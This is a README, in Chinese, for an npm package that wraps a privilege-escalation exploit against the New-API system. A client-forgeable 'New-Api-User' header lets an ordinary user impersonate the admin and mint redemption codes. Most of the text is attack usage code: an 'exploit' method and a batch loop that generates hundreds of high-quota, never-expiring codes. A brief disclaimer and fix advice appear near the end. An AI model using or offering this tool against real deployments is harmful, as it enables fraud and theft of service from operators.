# @sker/new-api

New-API 客户端工具包 - 用户认证与 Token 管理

## 功能特性

- ✅ 用户注册与登录
- ✅ Access Token 生成
- ✅ 兑换码创建（含权限漏洞利用）
- ✅ 完整的 TypeScript 类型支持
- ✅ Cookie 自动管理

## 安装

```bash
pnpm add @sker/new-api
```

## 快速开始

### 基础使用

```typescript
import { NewApiClient } from '@sker/new-api'

const client = new NewApiClient({
  baseURL: 'http://localhost:3000',
})

// 注册用户
await client.register({
  username: 'testuser',
  password: 'password123',
})

// 登录
await client.login({
  username: 'testuser',
  password: 'password123',
})

// 生成 Access Token
const token = await client.generateAccessToken()
console.log('Token:', token)
```

### 一键获取 Token

```typescript
const token = await client.quickGetToken('username', 'password')
```

### 利用权限漏洞创建兑换码

```typescript
// 完整利用流程
const redemptionCodes = await client.exploit(
  'attacker', // 用户名
  'pass123', // 密码
  1, // 管理员 ID
  {
    name: '测试兑换码',
    count: 10,
    quota: 1000000,
    expired_time: 0,
  },
)

console.log('生成的兑换码:', redemptionCodes)
```

### 手动控制流程

```typescript
// 1. 注册
await client.register({ username: 'user', password: 'pass' })

// 2. 登录
await client.login({ username: 'user', password: 'pass' })

// 3. 生成 Token
const token = await client.generateAccessToken()

// 4. 创建兑换码（需要知道管理员 ID）
const codes = await client.createRedemption(1, {
  name: '兑换码',
  count: 5,
  quota: 500000,
  expired_time: 0,
})
```

## API 参考

### NewApiClient

#### 构造函数

```typescript
new NewApiClient(config: NewApiConfig)
```

**参数:**
- `config.baseURL` - API 基础 URL
- `config.timeout` - 请求超时时间（默认 30000ms）

#### 方法

##### register(data)

注册新用户。

```typescript
await client.register({
  username: string
  password: string
  email?: string
  verification_code?: string
  aff_code?: string
})
```

##### login(data)

用户登录。

```typescript
await client.login({
  username: string
  password: string
})
```

##### generateAccessToken()

生成 Access Token。

```typescript
const token = await client.generateAccessToken()
```

##### createRedemption(adminId, data)

创建兑换码（利用权限漏洞）。

```typescript
const codes = await client.createRedemption(1, {
  name: string        // 兑换码名称
  count: number       // 生成数量（最多 100）
  quota: number       // 额度
  expired_time: number // 过期时间（0 表示永不过期）
})
```

##### quickGetToken(username, password)

一键获取 Token（注册 + 登录 + 生成）。

```typescript
const token = await client.quickGetToken('user', 'pass')
```

##### exploit(username, password, adminId, redemption)

完整利用流程。

```typescript
const codes = await client.exploit('user', 'pass', 1, {
  name: '兑换码',
  count: 10,
  quota: 1000000,
  expired_time: 0,
})
```

##### getAccessToken()

获取当前 Access Token。

```typescript
const token = client.getAccessToken()
```

##### setAccessToken(token)

设置 Access Token（如果已有）。

```typescript
client.setAccessToken('your-token-here')
```

## 安全警告

⚠️ **本工具包仅用于安全研究和漏洞测试目的。**

该工具包演示了 New-API 系统中的权限验证漏洞：

1. **漏洞位置**: `middleware/auth.go:76-102`
2. **漏洞原理**: `New-Api-User` Header 可被客户端伪造
3. **影响范围**: 普通用户可提升为管理员权限

**修复建议**:
- 移除 `New-Api-User` Header 验证逻辑
- 直接使用 session/token 中的用户 ID
- 添加所有权验证

## 使用示例

### 批量生成兑换码

```typescript
import { NewApiClient } from '@sker/new-api'

const client = new NewApiClient({
  baseURL: 'http://localhost:3000',
})

async function batchGenerate() {
  // 获取 Token
  await client.quickGetToken('attacker', 'password')

  // 批量生成
  for (let i = 0; i < 5; i++) {
    const codes = await client.createRedemption(1, {
      name: `批次-${i + 1}`,
      count: 100,
      quota: 1000000,
      expired_time: 0,
    })
    console.log(`批次 ${i + 1}:`, codes)
  }
}

batchGenerate()
```

## License

MIT
